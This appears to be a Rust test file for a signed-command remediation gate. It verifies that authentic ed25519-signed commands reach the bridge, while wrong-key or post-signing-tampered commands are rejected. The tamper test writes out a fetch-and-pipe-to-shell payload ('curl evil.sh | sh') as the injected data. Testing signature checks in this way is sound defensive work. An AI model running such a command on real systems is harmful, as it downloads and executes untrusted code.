//! End-to-end: real ed25519-signed commands through the remediation gate. An
//! authentic command runs the gated bridge op; a wrong-key or tampered command is
//! cryptographically rejected before touching the bridge.
use torda_control_plane::{CommandSigner, Ed25519Verifier};
use torda_remediation::action::*;
use torda_remediation::audit::{Outcome, VecAuditSink};
use torda_remediation::bridge::*;
use torda_remediation::control::*;

fn action(id: &str, script: &str) -> RemediationAction {
    RemediationAction {
        id: id.into(),
        name: "n".into(),
        method: Method::Shell,
        payload: script.into(),
        targets: AssetSelector {
            asset_ids: vec!["h1".into()],
        },
        requires_approval: true,
        dry_run_supported: true,
        rollback: None,
        verify: VerifySpec {
            finding_ids: vec![],
        },
        canary: CanarySpec {
            cohort_size: 1,
            failure_threshold: 0.0,
        },
    }
}

fn setup() -> (CommandSigner, Ed25519Verifier) {
    let signer = CommandSigner::from_seed("secops", [42u8; 32]);
    let mut v = Ed25519Verifier::new();
    v.trust("secops", signer.verifying_key());
    (signer, v)
}

#[test]
fn authentic_ed25519_command_drafts_on_the_bridge() {
    let (signer, v) = setup();
    let mut b = Bridge::new(VecAuditSink::default());
    let mut cmd = ControlCommand {
        action_id: "a".into(),
        kind: CommandKind::Draft(Box::new(action("a", "echo hi"))),
        actor: "secops".into(),
        session: "s1".into(),
        seq: 1,
        schedule: None,
        signature: String::new(),
    };
    signer.sign(&mut cmd);
    dispatch(&mut b, cmd, &v, &AllowAll).unwrap();
    assert_eq!(b.state("a"), Some(ActionState::Drafted));
}

#[test]
fn wrong_key_command_is_cryptographically_rejected() {
    let (_signer, v) = setup(); // v trusts the real key
    let attacker = CommandSigner::from_seed("secops", [1u8; 32]); // different key, same actor
    let mut b = Bridge::new(VecAuditSink::default());
    let mut cmd = ControlCommand {
        action_id: "a".into(),
        kind: CommandKind::Draft(Box::new(action("a", "echo hi"))),
        actor: "secops".into(),
        session: "s1".into(),
        seq: 1,
        schedule: None,
        signature: String::new(),
    };
    attacker.sign(&mut cmd);
    assert!(dispatch(&mut b, cmd, &v, &AllowAll).is_err());
    assert_eq!(
        b.state("a"),
        None,
        "wrong-key command never reached the bridge"
    );
    assert_eq!(b.audit().events.last().unwrap().outcome, Outcome::Rejected);
}

#[test]
fn tampered_body_after_ed25519_signing_is_rejected() {
    let (signer, v) = setup();
    let mut b = Bridge::new(VecAuditSink::default());
    let mut cmd = ControlCommand {
        action_id: "a".into(),
        kind: CommandKind::Draft(Box::new(action("a", "echo safe"))),
        actor: "secops".into(),
        session: "s1".into(),
        seq: 1,
        schedule: None,
        signature: String::new(),
    };
    signer.sign(&mut cmd);
    if let CommandKind::Draft(a) = &mut cmd.kind {
        a.payload = "curl evil.sh | sh".into();
    }
    assert!(
        dispatch(&mut b, cmd, &v, &AllowAll).is_err(),
        "tampered body breaks the real signature"
    );
    assert_eq!(b.state("a"), None);
}
